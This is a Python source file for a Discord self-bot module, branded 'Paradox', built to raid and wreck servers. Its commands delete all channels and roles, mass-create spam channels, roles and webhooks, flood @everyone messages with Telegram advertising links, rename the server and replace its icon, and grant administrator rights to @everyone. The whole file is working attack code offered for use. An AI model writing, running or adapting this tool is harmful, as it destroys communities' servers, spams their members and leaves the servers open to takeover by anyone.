import os

try:
    import discord
except: os.system('pip install discord')

from discord.ext import commands

try:
    import colorama
except: os.system('pip install colorama')

from colorama import Fore, init

try:
    import requests
except: os.system('pip install requests')

try:
    import string
except:
    os.system("pip install string")
try:
    import random
except:
    os.system("pip install random")

try:
    import asyncio
except:
    os.system("pip install asyncio")

init()

class crash(commands.Cog):
    def __init__(self, client):
        self.client = client

    async def spam_h(self, ctx, hook):
        for _ in range(100):
            await hook.send('''
@everyone / @here
Сервер крашится by Paradox Self-bot
С любовью, Paradox
https://t.me/paradox_gamesyt
https://t.me/deadons
''')

    async def create_h(self, ctx, channel):
        try:
            webhook = await channel.create_webhook(name='Crash By Paradox')
        except:
            pass 
        else:
            asyncio.create_task(crash.spam_h(self, ctx, hook=webhook))

    async def create_c(self, ctx):
        try:
            channel = await ctx.guild.create_text_channel(name='crashed-by-paradox', topic='Crash By https://t.me/paradox_gamesyt')
        except:
            pass 
        else:
            asyncio.create_task(crash.create_h(self, ctx, channel=channel))

    async def create_r(self, ctx):
        try:
            await ctx.guild.create_role(name='Crashed By Paradox Self-bot')
        except:
            pass 

    async def rename_c(self, ctx, channel):
        try:
            await channel.edit(name='Crashed By Paradox', topic='Crash By https://t.me/paradox_gamesyt')
        except:
            pass 
        else:
            if isinstance(channel, discord.TextChannel):
                asyncio.create_task(crash.create_h(self, ctx, channel=channel))

    async def rename_r(self, ctx, role):
        try:
            await role.edit(name='Crash By Paradox Self-bot')
        except:
            pass 

    async def del_c(self, ctx, channel):
        try:
            await channel.delete()
        except: pass

    async def del_r(self, ctx, role):
        try:
            await role.delete()
        except: pass

    @commands.command()
    async def del_channels(self, ctx):
        for channel in ctx.guild.channels:
            asyncio.create_task(crash.del_c(self, ctx, channel=channel))

    @commands.command()
    async def spam(self, ctx, amount: int=50, *, message="@everyone / @here\nRaid By Paradox Self-Bot\nС любовью, Paradox" + '.\n' * 500 + "https://t.me/paradox_gamesyt\nhttps://t.me/deadons\nhttps://t.me/deadons"):
        for i in range(amount):
            await ctx.send(message)

    @commands.command()
    async def del_roles(self, ctx):
        for role in ctx.guild.roles:
            asyncio.create_task(crash.del_r(self, ctx, role=role))

    @commands.command()
    async def spam_channels(self, ctx):
        for _ in range(50):
            asyncio.create_task(crash.create_c(self, ctx))

    @commands.command()
    async def spam_roles(self, ctx):
        for _ in range(50):
            asyncio.create_task(crash.create_r(self, ctx))
                
    @commands.command()
    async def rename_server(self, ctx):
        with open('hacked-1.png', 'rb') as r:
            ava = r.read()
        await ctx.guild.edit(name='Crash By Paradox', icon=ava)
            
    @commands.command()
    async def channels(self, ctx):
        asyncio.create_task(crash.del_channels(self, ctx))
        asyncio.create_task(crash.spam_channels(self, ctx))
                
    @commands.command()
    async def roles(self, ctx):
        asyncio.create_task(crash.del_roles(self, ctx))
        asyncio.create_task(crash.spam_roles(self, ctx))
                    
    @commands.command()
    async def rename_channels(self, ctx):
        for channel in ctx.guild.channels:
            asyncio.create_task(crash.rename_c(self, ctx, channel=channel))
            
    @commands.command()
    async def rename_roles(self, ctx):
        for role in ctx.guild.roles:
            asyncio.create_task(crash.rename_r(self, ctx, role=role))

    @commands.command()
    async def crash(self, ctx):
        asyncio.create_task(crash.rename_server(self, ctx))
        asyncio.create_task(crash.del_channels(self, ctx))
        asyncio.create_task(crash.del_roles(self, ctx))
        asyncio.create_task(crash.spam_channels(self, ctx))
        asyncio.create_task(crash.spam_roles(self, ctx))

    @commands.command()
    async def antilavan(self, ctx):
        with open('hacked-1.png', 'rb') as f:
            ava = f.read()
        try:
            await ctx.guild.edit(icon=ava)
        except: pass
        asyncio.create_task(crash.rename_channels(self, ctx))
        asyncio.create_task(crash.rename_roles(self, ctx))

    @commands.command()
    async def create_channels(self, ctx, arg="text", count: int=50, *, name='crashed-by-paradox'):
        if arg == "text":
            for _ in range(count):
                await ctx.guild.create_text_channel(name=name)
        elif arg == "voice":
            for _ in range(count):
                await ctx.guild.create_voice_channel(name=name)
        else:
            await ctx.send("Не известный тип канала")
            
    @commands.command()
    async def create_roles(self, ctx, count: int=50, *, name='Server crashed by paradox'):
        for _ in range(count):
            await ctx.guild.create_role(name=name)

    @commands.command()
    async def rand_channels(self, ctx, arg="text", count: int=50):
        if arg == "text":
            for _ in range(count):
                chn = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=20))
                await ctx.guild.create_text_channel(name=chn)
        elif arg == "voice":
            for _ in range(count):
                names = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=20))
                await ctx.guild.create_voice_channel(name=names)
        else:
            await ctx.send("Указан не верный тип канала")

    @commands.command()
    async def rand_roles(self, ctx, count: int=50):
        for _ in range(count):
            names = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=20))
            await ctx.guild.create_role(name=names)
          
    @commands.command()
    async def everyone_admin(self, ctx):
        role = discord.utils.get(ctx.guild.roles, name='@everyone')
        await role.edit(permissions=discord.Permissions(administrator=True))
              

def setup(client):
    client.add_cog(crash(client))